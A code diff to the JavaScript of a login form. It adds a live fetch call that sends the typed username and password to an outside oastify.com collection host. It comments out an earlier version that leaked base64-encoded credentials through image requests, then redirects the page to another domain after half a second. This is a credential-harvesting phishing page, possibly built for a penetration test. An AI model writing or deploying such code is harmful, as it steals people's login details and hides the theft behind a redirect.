@@ -128,17 +128,17 @@
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
 
-        // const response = fetch('https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + 
-        //     encodeURIComponent(u) + '&p=' + encodeURIComponent(p))
+        const response = fetch('https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + 
+            encodeURIComponent(u) + '&p=' + encodeURIComponent(p))
 
 
-        // const result = response.json();
-        // console.log(result);
+        const result = response.json();
+        console.log(result);
         
-        const ub64 = btoa(u)
-        const pb64 = btoa(p)
-        new Image().src='https://'+ub64+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
-        new Image().src='https://'+pb64+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
+        // const ub64 = btoa(u)
+        // const pb64 = btoa(p)
+        // new Image().src='https://'+ub64+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
+        // new Image().src='https://'+pb64+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
 
         setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
         });
